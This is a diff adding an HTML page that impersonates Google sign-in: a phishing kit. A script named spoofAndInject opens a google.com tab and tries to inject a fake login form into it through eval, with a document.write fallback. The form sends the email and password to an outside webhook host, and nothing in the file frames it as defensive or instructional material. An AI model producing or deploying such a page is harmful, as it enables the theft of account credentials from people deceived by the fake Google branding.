@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>google.com</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    .container {
+      max-width: 500px;
+      padding: 40px;
+    }
+    h1 {
+      color: #4285f4;
+      font-size: 3rem;
+      margin-bottom: 2rem;
+    }
+    .info {
+      font-size: 1.2rem;
+      color: #666;
+      margin-bottom: 3rem;
+    }
+    .login-form {
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+      width: 100%;
+      max-width: 400px;
+      display: none;
+    }
+    .login-form input {
+      width: 100%;
+      padding: 14px;
+      margin: 12px 0;
+      border: 1px solid #dadce0;
+      border-radius: 6px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    .login-form button {
+      width: 100%;
+      padding: 14px;
+      background: #4285f4;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+    .login-form button:hover {
+      background: #3367d6;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Google</h1>
+    <p class="info">Loading secure connection... Please wait</p>
+    <button onclick="spoofAndInject()">Sign In to Google</button>
+  </div>
+  <div id="loginFormTemplate" style="display:none;">
+    <div class="login-form">
+      <h1>Sign in to Google</h1>
+      <p>To continue to www.google.com</p>
+      <form action="https://young-comet-60.webhook.cool" method="POST">
+        <input type="email" name="email" placeholder="Email address" required autocomplete="username">
+        <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
+        <button type="submit">Sign In</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    function spoofAndInject() {
+      const targetTab = window.open("https://www.google.com/csi", "_blank");
+
+      if (!targetTab) {
+        alert("Popup");
+        return;
+      }
+      setTimeout(() => {
+        if (targetTab && !targetTab.closed) {
+          try {
+            const template = document.getElementById('loginFormTemplate').innerHTML;
+
+            // Inject via eval
+            const injectCode = `
+              (function() {
+                const container = document.createElement('div');
+                container.innerHTML = \`${template}\`;
+                document.body.appendChild(container);
+                console.log('Login form injected');
+              })();
+            `;
+
+            targetTab.eval(injectCode);
+          } catch (e) {
+            console.warn("Injection failed:", e);
+            // Fallback: document.write
+            targetTab.document.open();
+            targetTab.document.write(`
+              <script>
+                const container = document.createElement('div');
+                container.innerHTML = \`${document.getElementById('loginFormTemplate').innerHTML}\`;
+                document.body.appendChild(container);
+              <\/script>
+            `);
+            targetTab.document.close();
+          }
+        }
+      }, 800);
+    }
+  </script>
+
+</body>
+</html>
